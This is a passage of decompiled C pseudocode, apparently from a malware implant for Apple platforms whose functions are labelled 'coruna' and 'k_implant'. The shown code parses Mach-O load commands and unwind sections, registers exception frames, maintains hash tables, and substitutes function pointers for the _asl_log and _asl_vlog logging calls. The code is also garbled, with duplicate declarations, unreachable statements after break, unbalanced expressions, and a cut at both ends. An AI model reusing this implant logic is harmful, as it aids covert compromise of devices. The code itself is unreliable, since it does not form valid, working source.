      (*k_implant_rodata_word_245c0)(k_implant_rodata_word_245b8,k_implant_rodata_word_245c8,err,&bootargs);
      u = 0;
    }
    _free(scratch);
  }
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return u;
  }
  ___stack_chk_fail();
}





uint64_t coruna_return_zero_14200(char *path,uint64_t *val)
{
  int err;
  uint64_t u;
  void (*ptr)(void);
  
  if (path == (char *)0x0) {
    return 0;
  }
  if (val == (uint64_t *)0x0) {
    return 0;
  }
  if (k_implant_rodata_word_245b0 == '\0' || (k_implant_rodata_word_245b2 & 1) == 0) {
fail:
    u = 0;
  }
  else {
    err = _strcmp(path,"_asl_vlog");
    if (err == 0) {
      ptr = coruna_vasprintf;
    }
    else {
      err = _strcmp(path,"_asl_log");
      if (err != 0) goto fail;
      ptr = coruna_call_vasprintf;
    }
    *val = ptr;
    u = 1;
  }
  return u;
}





void coruna_call_vasprintf(void)
{
  coruna_vasprintf();
  return;
}





bool coruna_dladdr_142c0(void)
{
  char err;
  int err;
  long handle;
  long addr;
  long off;
  uint64_t scratch;
  long bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  
  err = _pthread_mutex_lock((pthread_mutex_t *)&k_implant_rodata_word_245d0);
  if (err != 0) {
    return false;
  }
  err = k_implant_rodata_word_245b1;
  _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_245d0);
  return err != '\0';
}





uint64_t coruna_implant65fc_via_macho_foreach_loadcmd_10(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else if ((*(ushort *)(handle + 0x1c0) & 0x18) == 0) {
    u = 0;
  }
  else {
    scratch = k_implant_nsconcretestackblock_slot;
    bootargs = k_implant_rodata_word_1e8b0;
    thread_attr = coruna_macho_unwind_info_14474;
    host_info = &k_implant_rodata_word_204e0;
    serial_buf = handle;
    u = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
  }
  return u;
}





uint64_t coruna_macho_unwind_info_14474(long handle,long addr_2)
{
  char *ptr;
  long *ptr;
  int err;
  uint64_t u;
  long handle;
  unsigned long size;
  long addr;
  char *buf;
  void *scratch;
  long bootargs;
  void *thread_attr;
  uint64_t host_info;
  
  ptr = (char *)(addr_2 + 0x48);
  buf = ptr + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
  do {
    if (buf <= ptr) {
      return 0;
    }
    err = _strncmp(ptr,"__eh_frame",0xb);
    if (err == 0) {
      u = coruna_vec_push_pair(*(long *)(handle + 0x20) + 0xe8,*(long *)(handle + 0x20) + 0xf0);
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(handle + 0x20);
      if (*(long *)(handle + 0xe8) == 0) {
        return 0xad001;
      }
      size = *(unsigned long *)(ptr + 0x28);
      if (4 < size >> 0x15) {
        return 0xad014;
      }
      ptr = (long *)(*(long *)(handle + 0xe8) + (unsigned long)(*(int *)(handle + 0xf0) - 1) * 0x10);
      *ptr = *(long *)(ptr + 0x20) + *(long *)(handle + 0x18);
      *(int *)(ptr + 1) = (int)size;
      *(uint8_t *)((long)ptr + 0xc) = 0;
      handle = *(long *)(handle + 0x20);
fail:
      *(uint8_t *)(handle + 0xfd) = 1;
    }
    else {
      err = _strncmp(ptr,"__unwind_info",0xe);
      if (err == 0) {
        addr = *(long *)(handle + 0x20);
        host_info = 0;
        scratch = (void *)0x0;
        handle = *(long *)(ptr + 0x20) + *(long *)(addr + 0x18);
        u = coruna_return_zero_15dbc(handle,coruna_reallocf,&scratch);
        if ((int)u != 0) {
          return u;
        }
        thread_attr = scratch;
        bootargs = addr;
        u = coruna_return_zero_15dbc(handle,coruna_bzero_5_2,&bootargs);
        _free(scratch);
        if ((int)u != 0) {
          return u;
        }
        handle = *(long *)(handle + 0x20);
        if (*(int *)(handle + 0xf0) != 0) goto fail;
      }
    }
    ptr = ptr + 0x50;
  } while( true );
}





uint64_t coruna_vec_push_pair(uint64_t *val,uint *size)
{
  uint64_t *ptr;
  uint u;
  void *ptr;
  uint64_t size;
  
  size = 0xad001;
  if ((size != (uint *)0x0) && (val != (uint64_t *)0x0)) {
    u = *size;
    ptr = _realloc((void *)*val,(unsigned long)(u + 1) << 4);
    if (ptr == (void *)0x0) {
      size = 0xad009;
    }
    else {
      size = 0;
      ptr = (uint64_t *)((long)ptr + (unsigned long)*size * 0x10);
      *ptr = 0;
      ptr[1] = 0;
      *val = ptr;
      *size = u + 1;
    }
  }
  return size;
}
unsigned long coruna_strnlen(long *arg)

{
  int *fde;
  long *ptr;
  uint size;
  uint type_id_8;
  uint version;
  int count;
  uint tag;
  uint64_t kind;
  uint8_t type_id_13;
  uint type_id;
  uint type_id_9;
  long serial_7;
  unsigned long type_id_15;
  size_t ls13;
  byte *entry;
  byte *entry_9;
  void *entry_10;
  void *entry_11;
  int i;
  long serial_8;
  long *entry_12;
  unsigned long type_id_17;
  uint64_t *block;
  long serial_9;
  long serial_10;
  unsigned long type_id_18;
  long serial_11;
  byte *entry_13;
  uint *entry;
  unsigned long type_id_19;
  unsigned long type_id_20;
  long serial_12;
  byte *entry_14;
  byte *entry_15;
  char *entry_10;
  long *entry_16;
  int *count;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t cache_55;
  uint64_t region;
  long cache_57;
  uint64_t cache_58;
  char *cache_59;
  uint64_t plist;
  uint64_t url_buf;
  unsigned long sa_new [2];
  uint64_t json_buf;
  uint64_t *region;
  uint64_t plist;
  long url_buf;
  uint32_t frame;
  uint scratch;
  uint cache_60;
  uint64_t bootargs[2];
  
  if (arg == (long *)0x0) {
    type_id_15 = 0xad001;
  }
  else if (*(char *)((long)arg + 0xfd) == '\0') {
    type_id_15 = 0;
  }
  else {
    serial_7 = *arg;
    if ((*(int *)(serial_7 + 0x118) != 1) ||
       (type_id_15 = coruna_macho_data_seg(serial_7,*(uint64_t *)(serial_7 + 0x110),serial_7 + 0x120),
       (int)type_id_15 == 0)) {
      serial_7 = k_implant_rodata_word_1e8d8;
      serial_8 = arg[0x1d];
      type_id_15 = 0xad00f;
      if ((serial_8 != 0) && ((int)arg[0x1e] != 0)) {
        type_id_15 = 0;
        type_id_20 = 0;
        do {
          type_id = 0xad00f;
          if ((serial_8 != 0) && (serial_10 = *(long *)(serial_8 + type_id_15 * 0x10), serial_10 != 0)) {
            version = *(uint *)(serial_8 + type_id_15 * 0x10 + 8);
            if (version == 0) {
              type_id = 0xad00f;
            }
            else {
              type_id_18 = 0;
              do {
                int frame_done = 0;
                while( true ) {
                  fde = (int *)(serial_10 + type_id_18);
                  count = *fde;
                  if (fde[1] != 0) break;
                  type_id = (int)type_id_18 + count + 4;
                  type_id_18 = (unsigned long)type_id;
                  if (version <= type_id) {
                    frame_done = 1;
                    break;
                  }
                }
                if (frame_done) {
                  type_id = 0;
                  *(uint8_t *)(arg + 0x22) = 1;
                  *(uint8_t *)(arg + 0x26) = 1;
                  break;
                }
                url_buf = 0;
                json_buf = 0;
                sa_new[1] = 0;
                plist = 0;
                region = (uint64_t *)0x0;
                plist = 0;
                sa_new[0] = 0;
                url_buf = 0;
                region = 0;
                cache_55 = 0;
                cache_57 = 0;
                sa_new = 0;
                tmp_buf = 0;
                path_buf = 0;
                type_id = 0xad001;
                break;
                type_id_9 = *fde + 4;
                frame = 0;
                scratch = 8;
                count = (int *)((long)(fde + 1) - (unsigned long)(uint)fde[1]);
                if (count[1] != 0) {
load_ok_47:
                  type_id = 0xad014;
                  break;
                }
                cache_58 = (unsigned long)coruna_u64_pack14((*(byte *)(count + 2)), (*count + 4));
                if ((*(byte *)(count + 2) | 2) != 3) {
load_ok_48:
                  type_id = 0xad008;
                  break;
                }
                cache_59 = (char *)((long)count + 9);
                ls13 = _strnlen(cache_59,5);
                type_id = 0xad014;
                break;
                cache_60 = (int)ls13 + 10;
                bootargs[0] = 0;
                if ((count == (int *)0x0) || ((uint)cache_58 <= cache_60)) {
load_ok_46:
                  type_id = 0xad001;
                  break;
                }
                type_id = coruna_read_uleb128(&plist,bootargs,count,&cache_60);
                if ((type_id != 0) ||
                   (type_id = coruna_sign_extend_uleb(&url_buf,count,&cache_60,cache_58 & 0xffffffff),
                   break;
                if (cache_58 == '\x03') {
                  bootargs[0] = 0;
                  type_id = 0xad001;
                  break;
                  type_id = coruna_read_uleb128(sa_new,bootargs,count,&cache_60);
                  break;
                }
                else {
                  type_id = 0xad014;
                  break;
                  sa_new[0] = (unsigned long)*(byte *)((long)count + (unsigned long)cache_60);
                  cache_60 = cache_60 + 1;
                }
                entry_10 = cache_59;
                if (*cache_59 == 'z') {
                  bootargs[0] = 0;
                  type_id = 0xad001;
                  break;
                  type_id = coruna_read_uleb128(sa_new + 1,bootargs,count,&cache_60);
                  break;
                  entry_10 = entry_10 + 1;
                }
                json_buf = -1;
                plist = coruna_cat(plist,0xffff);
                while( true ) {
                  kind = plist;
                  if (*entry_10 == 0) break;
                  type_id = 0xad008;
                  switch((int)*entry_10) {
                  case 0x4c:
                    plist = coruna_u64_pack71((plist), (*(uint8_t *))((long)count + (unsigned long)cache_60));
                    type_id = 0;
                    cache_60 = cache_60 + 1;
                    break;
                  default:
                    break;
                  case 0x50:
                    json_buf = *(char *)((long)count + (unsigned long)cache_60);
                    cache_60 = cache_60 + 1;
                    type_id = coruna_implant65fc_via_sign_extend_uleb(&region,(char)json_buf,count,&cache_60,
                                         cache_58 & 0xffffffff,0);
                    break;
                  case 0x52:
                    plist =
                         coruna_cat(*(uint8_t *)((long)count + (unsigned long)cache_60),
                                  (uint8_t)plist);
load_ok_49:
                    type_id = 0;
                    cache_60 = cache_60 + 1;
                    break;
                  case 0x53:
                    type_id = 0;
                    plist = coruna_cat(1,(uint16_t)plist);
                  }
                  entry_10 = entry_10 + 1;
                  break;
                }
                plist = coruna_u64_pack(((uint)cache_58 - cache_60), ((uint32_t))plist);
                type_id_17 = plist;
                url_buf = (long)count + (unsigned long)cache_60;
                plist = SUB81(kind,1);
                type_id_13 = plist;
                plist = type_id_17;
                type_id = coruna_implant65fc_via_sign_extend_uleb(&sa_new,type_id_13,fde,&scratch,type_id_9,0);
                break;
                type_id = coruna_implant65fc_via_sign_extend_uleb(&path_buf,plist,fde,&scratch,type_id_9,1);
                break;
                if (*cache_59 == 'z') {
                  bootargs[0] = 0;
                  type_id = 0xad001;
                  break;
                  type_id = coruna_read_uleb128(&tmp_buf,bootargs,fde,&scratch);
                  break;
                }
                type_id = coruna_implant65fc_via_sign_extend_uleb(&cache_55,plist & 0xff,fde,&scratch,type_id_9,0);
                break;
                region = coruna_u64_pack((region), (type_id_9 - scratch));
                cache_57 = (long)fde + (unsigned long)scratch;
                if (region != (uint64_t *)0x0) {
                  type_id = 0xad008;
                  break;
                  type_id_9 = _pthread_mutex_lock((pthread_mutex_t *)&k_implant_rodata_word_24610);
                  if (type_id_9 == 0) {
                    if (k_implant_rodata_word_24ca0 != (byte *)0x0) {
                      i = (uint)cache_55 * 0x1000000 + -0x61c88647 +
                               (uint)cache_55 * 0x10000 + (uint)cache_55 * 0x100 +
                               (uint)cache_55;
                      type_id = (((uint)cache_55 * 0x1000000 + -0x60b6453e) - i) +
                              (uint)cache_55 * 0x10000 + (uint)cache_55 * 0x100 +
                              (uint)(byte)cache_55 ^ 0x7f76d;
                      type_id_9 = (i + 0x1124109) - type_id ^ type_id << 8;
                      type_id_8 = 0xfeedbef7 - (type_id + type_id_9) ^ type_id_9 >> 0xd;
                      type_id = type_id - (type_id_9 + type_id_8) ^ type_id_8 >> 0xc;
                      type_id_9 = type_id_9 - (type_id_8 + type_id) ^ type_id << 0x10;
                      type_id_8 = type_id_8 - (type_id + type_id_9) ^ type_id_9 >> 5;
                      type_id = type_id - (type_id_9 + type_id_8) ^ type_id_8 >> 3;
                      type_id_9 = type_id_9 - (type_id_8 + type_id) ^ type_id << 10;
                      type_id = type_id_8 - (type_id + type_id_9) ^ type_id_9 >> 0xf;
                      entry_12 = *(long **)(k_implant_rodata_word_24ca0 + 0x18);
                      serial_8 = *(long *)(*entry_12 + (unsigned long)((int)entry_12[1] - 1U & type_id) * 0x10);
                      if (serial_8 != 0) {
                        do {
                          serial_8 = serial_8 - entry_12[4];
                          if (((*(uint *)(serial_8 + 0x4c) == type_id) && (*(int *)(serial_8 + 0x48) == 8)
                              ) && (**(long **)(serial_8 + 0x40) == cache_55)) {
                            if (region == *(uint64_t **)(serial_8 + 0x10)) {
                              _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_24610);
                              ___register_frame(fde);
                              type_id = (int)type_id_18 + count + 4;
                              type_id_18 = (unsigned long)type_id;
                            }
                            else {
                            type_id = 0xad008;
                            _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_24610);
                            }
                          }
                          serial_8 = *(long *)(serial_8 + 0x38);
                        } while (serial_8 != 0);
                      }
                    }
                    if ((char)json_buf < '\0') {
                      entry = _calloc(1,0x50);
                      block = region;
                      if (entry == (byte *)0x0) {
                        type_id = 0xad009;
                      }
                      else {
                        serial_8 = arg[0x20];
                        *(long *)entry = cache_55;
                        *(long *)(entry + 8) = serial_8;
                        *(uint64_t **)(entry + 0x10) = region;
                        if (k_implant_rodata_word_24ca8 != (byte *)0x0) {
                          type_id = (uint)((unsigned long)region >> 0x20);
                          i = (type_id & 0xff000000) + 0x9e3779b9 + (type_id & 0xff0000) +
                                   (type_id & 0xff00) + (type_id & 0xff);
                          type_id = (uint)region;
                          type_id = ((type_id & 0xff000000) + 0x9f49bac2 + (type_id & 0xff0000) +
                                   (type_id & 0xff00) + (type_id & 0xff)) - i ^ 0x7f76d;
                          type_id_9 = (i + 0x1124109) - type_id ^ type_id << 8;
                          type_id_8 = 0xfeedbef7 - (type_id + type_id_9) ^ type_id_9 >> 0xd;
                          type_id = type_id - (type_id_9 + type_id_8) ^ type_id_8 >> 0xc;
                          type_id_9 = type_id_9 - (type_id_8 + type_id) ^ type_id << 0x10;
                          type_id_8 = type_id_8 - (type_id + type_id_9) ^ type_id_9 >> 5;
                          type_id = type_id - (type_id_9 + type_id_8) ^ type_id_8 >> 3;
                          type_id_9 = type_id_9 - (type_id_8 + type_id) ^ type_id << 10;
                          type_id = type_id_8 - (type_id + type_id_9) ^ type_id_9 >> 0xf;
                          entry_12 = *(long **)(k_implant_rodata_word_24ca8 + 0x10);
                          serial_8 = *(long *)(*entry_12 + (unsigned long)((int)entry_12[1] - 1U & type_id) * 0x10
                                            );
                          if (serial_8 != 0) {
                            do {
                              serial_8 = serial_8 - entry_12[4];
                              if (((*(uint *)(serial_8 + 0x44) == type_id) &&
                                  (*(int *)(serial_8 + 0x40) == 8)) &&
                                 (**(long **)(serial_8 + 0x38) == *(long *)(entry + 0x10)))
                              goto load_ok_52;
                              serial_8 = *(long *)(serial_8 + 0x30);
                            } while (serial_8 != 0);
                          }
                        }
                        entry_9 = _calloc(1,0x48);
                        if (entry_9 != (byte *)0x0) {
                          *(uint64_t **)entry_9 = block;
                          *(uint64_t *)(entry_9 + 8) = *block;
                          *block = coruna_unw_get_proc_info;
                          i = (uint)entry_9[7] * 0x1000000 + -0x61c88647 +
                                   (uint)entry_9[6] * 0x10000 + (uint)entry_9[5] * 0x100 +
                                   (uint)entry_9[4];
                          type_id = (((uint)entry_9[3] * 0x1000000 + -0x60b6453e) - i) +
                                  (uint)entry_9[2] * 0x10000 + (uint)entry_9[1] * 0x100 +
                                  (uint)*entry_9 ^ 0x7f76d;
                          type_id_9 = (i + 0x1124109) - type_id ^ type_id << 8;
                          type_id_8 = 0xfeedbef7 - (type_id + type_id_9) ^ type_id_9 >> 0xd;
                          type_id = type_id - (type_id_9 + type_id_8) ^ type_id_8 >> 0xc;
                          type_id_9 = type_id_9 - (type_id_8 + type_id) ^ type_id << 0x10;
                          type_id_8 = type_id_8 - (type_id + type_id_9) ^ type_id_9 >> 5;
                          type_id = type_id - (type_id_9 + type_id_8) ^ type_id_8 >> 3;
                          type_id_9 = type_id_9 - (type_id_8 + type_id) ^ type_id << 10;
                          type_id = type_id_8 - (type_id + type_id_9) ^ type_id_9 >> 0xf;
                          entry_13 = entry_9 + 0x10;
                          *(byte **)(entry_9 + 0x38) = entry_9;
                          entry_9[0x40] = 8;
                          entry_9[0x41] = 0;
                          entry_9[0x42] = 0;
                          entry_9[0x43] = 0;
                          *(uint *)(entry_9 + 0x44) = type_id;
                          entry_15 = k_implant_rodata_word_24ca8;
                          if (k_implant_rodata_word_24ca8 == (byte *)0x0) {
                            entry_12 = _calloc(1,0x40);
                            entry_9[0x18] = 0;
                            entry_9[0x19] = 0;
                            entry_9[0x1a] = 0;
                            entry_9[0x1b] = 0;
                            entry_9[0x1c] = 0;
                            entry_9[0x1d] = 0;
                            entry_9[0x1e] = 0;
                            entry_9[0x1f] = 0;
                            entry_9[0x20] = 0;
                            entry_9[0x21] = 0;
                            entry_9[0x22] = 0;
                            entry_9[0x23] = 0;
                            entry_9[0x24] = 0;
                            entry_9[0x25] = 0;
                            entry_9[0x26] = 0;
                            entry_9[0x27] = 0;
                            *(long **)(entry_9 + 0x10) = entry_12;
                            if (entry_12 != (long *)0x0) {
                              entry_12[1] = serial_7;
                              entry_12[3] = (long)entry_13;
                              entry_12[4] = 0x10;
                              entry_10 = _calloc(1,0x200);
                              *entry_12 = (long)entry_10;
                              *(uint32_t *)(entry_12 + 7) = 0xa0111fe1;
                              if (entry_10 != (void *)0x0) {
                                serial_11 = 0;
                                i = 0x20;
                                serial_8 = 0x10;
                                entry_15 = entry_9;
                                entry_16 = entry_12;
                                k_implant_rodata_word_24ca8 = entry_9;
                                goto load_ok_53;
                              }
                              _free(entry_12);
                            }
                            entry_13[0] = 0;
                            entry_13[1] = 0;
                            entry_13[2] = 0;
                            entry_13[3] = 0;
                            entry_13[4] = 0;
                            entry_13[5] = 0;
                            entry_13[6] = 0;
                            entry_13[7] = 0;
                          }
                          else {
                            entry_16 = *(long **)(k_implant_rodata_word_24ca8 + 0x10);
                            *(long **)(entry_9 + 0x10) = entry_16;
                            entry_9[0x20] = 0;
                            entry_9[0x21] = 0;
                            entry_9[0x22] = 0;
                            entry_9[0x23] = 0;
                            entry_9[0x24] = 0;
                            entry_9[0x25] = 0;
                            entry_9[0x26] = 0;
                            entry_9[0x27] = 0;
                            entry_12 = *(long **)(entry_15 + 0x10);
                            serial_9 = entry_12[3];
                            serial_8 = entry_12[4];
                            serial_11 = serial_9 - serial_8;
                            *(long *)(entry_9 + 0x18) = serial_11;
                            *(byte **)(serial_9 + 0x10) = entry_9;
                            entry_12[3] = (long)entry_13;
                            i = (int)entry_12[1];
load_ok_53:
                            *(int *)(entry_12 + 2) = (int)entry_12[2] + 1;
                            type_id_17 = (unsigned long)(i - 1U & type_id);
                            serial_9 = *entry_12;
                            ptr = (long *)(serial_9 + type_id_17 * 0x10);
                            entry = (uint *)(ptr + 1);
                            type_id_9 = *entry + 1;
                            *entry = type_id_9;
                            serial_12 = *ptr;
                            entry_14 = entry_9 + 0x28;
                            entry_14[0] = 0;
                            entry_14[1] = 0;
                            entry_14[2] = 0;
                            entry_14[3] = 0;
                            entry_14[4] = 0;
                            entry_14[5] = 0;
                            entry_14[6] = 0;
                            entry_14[7] = 0;
                            *(long *)(entry_9 + 0x30) = serial_12;
                            if (serial_12 != 0) {
                              *(byte **)(serial_12 + 0x18) = entry_13;
                            }
                            *ptr = (long)entry_13;
                            if ((*(int *)(serial_9 + type_id_17 * 0x10 + 0xc) * 10 + 10U <= type_id_9) &&
                               (*(int *)((long)entry_16 + 0x34) == 0)) {
                              type_id_8 = *(uint *)(entry_16 + 1);
                              entry_10 = _malloc((unsigned long)type_id_8 << 5);
                              if (entry_10 == (void *)0x0) {
                                *ptr = serial_12;
                                serial_9 = *(long *)entry_14;
                                if (serial_9 != 0) {
                                  *(long *)(serial_9 + 0x20) = serial_12;
                                  serial_12 = *(long *)(entry_9 + 0x30);
                                }
                                if (serial_12 != 0) {
                                  *(long *)(serial_12 + 0x18) = serial_9;
                                }
                                *entry = type_id_9;
                                entry_14[0] = 0;
                                entry_14[1] = 0;
                                entry_14[2] = 0;
                                entry_14[3] = 0;
                                entry_14[4] = 0;
                                entry_14[5] = 0;
                                entry_14[6] = 0;
                                entry_14[7] = 0;
                                entry_9[0x30] = 0;
                                entry_9[0x31] = 0;
                                entry_9[0x32] = 0;
                                entry_9[0x33] = 0;
                                entry_9[0x34] = 0;
                                entry_9[0x35] = 0;
                                entry_9[0x36] = 0;
                                entry_9[0x37] = 0;
                                if (serial_11 == 0) {
                                  entry_9 = *(byte **)(entry_9 + 0x20);
                                  if (entry_9 != (byte *)0x0) {
                                    entry_12[3] = serial_8;
                                    entry_12 = *(long **)(entry_9 + 0x10);
                                    k_implant_rodata_word_24ca8 = entry_9;
                                    goto load_ok_54;
                                  }
                                  _free((void *)**(uint64_t **)(entry_15 + 0x10));
                                  _free(*(void **)(entry_15 + 0x10));
                                  k_implant_rodata_word_24ca8 = (byte *)0x0;
                                }
                                else {
                                  entry_12[3] = serial_11 + serial_8;
                                  *(uint64_t *)(serial_11 + serial_8 + 0x10) =
                                       *(uint64_t *)(entry_9 + 0x20);
                                  entry_9 = *(byte **)(entry_9 + 0x20);
                                  entry_12 = *(long **)(entry_15 + 0x10);
                                  if (entry_9 != (byte *)0x0) {
load_ok_54:
                                    *(long *)(entry_9 + entry_12[4] + 8) = serial_11;
                                  }
                                  block = (uint64_t *)
                                            (*entry_12 + (unsigned long)((int)entry_12[1] - 1U & type_id) * 0x10
                                            );
                                  *(int *)(block + 1) = *(int *)(block + 1) + -1;
                                  if ((byte *)*block == entry_13) {
                                    *block = 0;
                                  }
                                  *(int *)(entry_12 + 2) = (int)entry_12[2] + -1;
                                }
                                entry_13[0] = 0;
                                entry_13[1] = 0;
                                entry_13[2] = 0;
                                entry_13[3] = 0;
                                entry_13[4] = 0;
                                entry_13[5] = 0;
                                entry_13[6] = 0;
                                entry_13[7] = 0;
                              }
                              else {
                                _bzero(entry_10,(unsigned long)type_id_8 << 5);
                                entry_12 = *(long **)entry_13;
                                type_id_9 = *(uint *)(entry_12 + 1);
                                type_id = *(uint *)(entry_12 + 2) >>
                                        (unsigned long)(*(int *)((long)entry_12 + 0xc) + 1U & 0x1f);
                                type_id_8 = type_id_9 * 2 - 1;
                                if ((type_id_8 & *(uint *)(entry_12 + 2)) != 0) {
                                  type_id = type_id + 1;
                                }
                                *(uint *)(entry_12 + 5) = type_id;
                                *(uint32_t *)((long)entry_12 + 0x2c) = 0;
                                if (type_id_9 == 0) {
                                  entry_11 = (void *)*entry_12;
                                }
                                else {
                                  i = 0;
                                  type_id_17 = 0;
                                  entry_11 = (void *)*entry_12;
                                  do {
                                    serial_8 = *(long *)((long)entry_11 + type_id_17 * 0x10);
                                    while (serial_8 != 0) {
                                      serial_11 = *(long *)(serial_8 + 0x20);
                                      type_id_19 = (unsigned long)(*(uint *)(serial_8 + 0x34) & type_id_8);
                                      size = *(int *)((long)entry_10 + type_id_19 * 0x10 + 8) + 1;
                                      *(uint *)((long)entry_10 + type_id_19 * 0x10 + 8) = size;
                                      if (type_id < size) {
                                        i = i + 1;
                                        *(int *)((long)entry_12 + 0x2c) = i;
                                        tag = 0;
                                        if (type_id != 0) {
                                          tag = size / type_id;
                                        }
                                        *(uint *)((long)entry_10 + type_id_19 * 0x10 + 0xc) = tag;
                                      }
                                      *(uint64_t *)(serial_8 + 0x18) = 0;
                                      entry_16 = (long *)((long)entry_10 + type_id_19 * 0x10);
                                      serial_9 = *entry_16;
                                      *(long *)(serial_8 + 0x20) = serial_9;
                                      if (serial_9 != 0) {
                                        *(long *)(serial_9 + 0x18) = serial_8;
                                      }
                                      *entry_16 = serial_8;
                                      serial_8 = serial_11;
                                    }
                                    type_id_17 = type_id_17 + 1;
                                  } while (type_id_17 != type_id_9);
                                }
                                _free(entry_11);
                                block = *(uint64_t **)entry_13;
                                *(int *)(block + 1) = *(int *)(block + 1) << 1;
                                *(int *)((long)block + 0xc) = *(int *)((long)block + 0xc) + 1;
                                *block = entry_10;
                                if (*(uint *)(block + 2) >> 1 < *(uint *)((long)block + 0x2c)) {
                                  i = *(int *)(block + 6);
                                  *(uint *)(block + 6) = i + 1U;
                                  if (1 < i + 1U) {
                                    *(uint32_t *)((long)block + 0x34) = 1;
                                  }
                                }
                                else {
                                  *(uint32_t *)(block + 6) = 0;
                                }
                              }
                            }
                          }
load_ok_52:
                          i = (uint)entry[7] * 0x1000000 + -0x61c88647 +
                                   (uint)entry[6] * 0x10000 + (uint)entry[5] * 0x100 +
                                   (uint)entry[4];
                          type_id = (((uint)entry[3] * 0x1000000 + -0x60b6453e) - i) +
                                  (uint)entry[2] * 0x10000 + (uint)entry[1] * 0x100 +
                                  (uint)*entry ^ 0x7f76d;
                          type_id_9 = (i + 0x1124109) - type_id ^ type_id << 8;
                          type_id_8 = 0xfeedbef7 - (type_id + type_id_9) ^ type_id_9 >> 0xd;
                          type_id = type_id - (type_id_9 + type_id_8) ^ type_id_8 >> 0xc;
                          type_id_9 = type_id_9 - (type_id_8 + type_id) ^ type_id << 0x10;
                          type_id_8 = type_id_8 - (type_id + type_id_9) ^ type_id_9 >> 5;
                          type_id = type_id - (type_id_9 + type_id_8) ^ type_id_8 >> 3;
                          type_id_9 = type_id_9 - (type_id_8 + type_id) ^ type_id << 10;
                          type_id = type_id_8 - (type_id + type_id_9) ^ type_id_9 >> 0xf;
                          entry_9 = entry + 0x18;
                          *(byte **)(entry + 0x40) = entry;
                          entry[0x48] = 8;
                          entry[0x49] = 0;
                          entry[0x4a] = 0;
                          entry[0x4b] = 0;
                          *(uint *)(entry + 0x4c) = type_id;
                          entry_13 = k_implant_rodata_word_24ca0;
                          if (k_implant_rodata_word_24ca0 == (byte *)0x0) {
                            entry_12 = _calloc(1,0x40);
                            entry[0x20] = 0;
                            entry[0x21] = 0;
                            entry[0x22] = 0;
                            entry[0x23] = 0;
                            entry[0x24] = 0;
                            entry[0x25] = 0;
                            entry[0x26] = 0;
                            entry[0x27] = 0;
                            entry[0x28] = 0;
                            entry[0x29] = 0;
                            entry[0x2a] = 0;
                            entry[0x2b] = 0;
                            entry[0x2c] = 0;
                            entry[0x2d] = 0;
                            entry[0x2e] = 0;
                            entry[0x2f] = 0;
                            *(long **)(entry + 0x18) = entry_12;
                            if (entry_12 != (long *)0x0) {
                              entry_12[1] = serial_7;
                              entry_12[3] = (long)entry_9;
                              entry_12[4] = 0x18;
                              entry_10 = _calloc(1,0x200);
                              *entry_12 = (long)entry_10;
                              *(uint32_t *)(entry_12 + 7) = 0xa0111fe1;
                              if (entry_10 != (void *)0x0) {
                                serial_11 = 0;
                                i = 0x20;
                                serial_8 = 0x18;
                                entry_13 = entry;
                                entry_16 = entry_12;
                                k_implant_rodata_word_24ca0 = entry;
                                goto load_ok_55;
                              }
                              _free(entry_12);
                            }
                            entry_9[0] = 0;
                            entry_9[1] = 0;
                            entry_9[2] = 0;
                            entry_9[3] = 0;
                            entry_9[4] = 0;
                            entry_9[5] = 0;
                            entry_9[6] = 0;
                            entry_9[7] = 0;
                          }
                          else {
                            entry_16 = *(long **)(k_implant_rodata_word_24ca0 + 0x18);
                            *(long **)(entry + 0x18) = entry_16;
                            entry[0x28] = 0;
                            entry[0x29] = 0;
                            entry[0x2a] = 0;
                            entry[0x2b] = 0;
                            entry[0x2c] = 0;
                            entry[0x2d] = 0;
                            entry[0x2e] = 0;
                            entry[0x2f] = 0;
                            entry_12 = *(long **)(entry_13 + 0x18);
                            serial_9 = entry_12[3];
                            serial_8 = entry_12[4];
                            serial_11 = serial_9 - serial_8;
                            *(long *)(entry + 0x20) = serial_11;
                            *(byte **)(serial_9 + 0x10) = entry;
                            entry_12[3] = (long)entry_9;
                            i = (int)entry_12[1];
load_ok_55:
                            *(int *)(entry_12 + 2) = (int)entry_12[2] + 1;
                            type_id_17 = (unsigned long)(i - 1U & type_id);
                            serial_9 = *entry_12;
                            ptr = (long *)(serial_9 + type_id_17 * 0x10);
                            entry = (uint *)(ptr + 1);
                            type_id_9 = *entry + 1;
                            *entry = type_id_9;
                            serial_12 = *ptr;
                            entry_15 = entry + 0x30;
                            entry_15[0] = 0;
                            entry_15[1] = 0;
                            entry_15[2] = 0;
                            entry_15[3] = 0;
                            entry_15[4] = 0;
                            entry_15[5] = 0;
                            entry_15[6] = 0;
                            entry_15[7] = 0;
                            *(long *)(entry + 0x38) = serial_12;
                            if (serial_12 != 0) {
                              *(byte **)(serial_12 + 0x18) = entry_9;
                            }
                            *ptr = (long)entry_9;
                            if ((*(int *)(serial_9 + type_id_17 * 0x10 + 0xc) * 10 + 10U <= type_id_9) &&
                               (*(int *)((long)entry_16 + 0x34) == 0)) {
                              type_id_8 = *(uint *)(entry_16 + 1);
                              entry_10 = _malloc((unsigned long)type_id_8 << 5);
                              if (entry_10 == (void *)0x0) {
                                *ptr = serial_12;
                                serial_9 = *(long *)entry_15;
                                if (serial_9 != 0) {
                                  *(long *)(serial_9 + 0x20) = serial_12;
                                  serial_12 = *(long *)(entry + 0x38);
                                }
                                if (serial_12 != 0) {
                                  *(long *)(serial_12 + 0x18) = serial_9;
                                }
                                *entry = type_id_9;
                                entry_15[0] = 0;
                                entry_15[1] = 0;
                                entry_15[2] = 0;
                                entry_15[3] = 0;
                                entry_15[4] = 0;
                                entry_15[5] = 0;
                                entry_15[6] = 0;
                                entry_15[7] = 0;
                                entry[0x38] = 0;
                                entry[0x39] = 0;
                                entry[0x3a] = 0;
                                entry[0x3b] = 0;
                                entry[0x3c] = 0;
                                entry[0x3d] = 0;
                                entry[0x3e] = 0;
